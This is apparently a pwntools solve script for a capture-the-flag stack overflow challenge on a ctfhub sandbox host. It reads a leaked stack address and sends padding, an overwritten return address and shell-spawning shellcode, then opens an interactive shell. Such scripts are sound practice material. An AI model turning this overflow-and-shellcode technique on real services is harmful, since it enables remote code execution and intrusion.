from pwn import * 
from pwn import p64


debug = 0
gdb_is = 0

# context(arch='i386',os = 'linux', log_level='DEBUG')
context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
    r = process("./pwn")
else:
    host = "challenge-21a51b20333563f2.sandbox.ctfhub.com"
    r = connect(host,28297)#远程连接
    gdb_is =0

if gdb_is:
    gdb.attach(r,'b* 0x400683')
    pause()
    pass

elf = ELF('./pwn')  
code_addr = int(r.recvuntil(b'?')[-17:-3],16)
print(hex(code_addr))
shellcode = asm(shellcraft.sh())
payload = b'A' * 0x10 + b'junkjunk' + p64(code_addr+0x20) + shellcode
r.sendlineafter(b'someting',payload)

r.interactive()

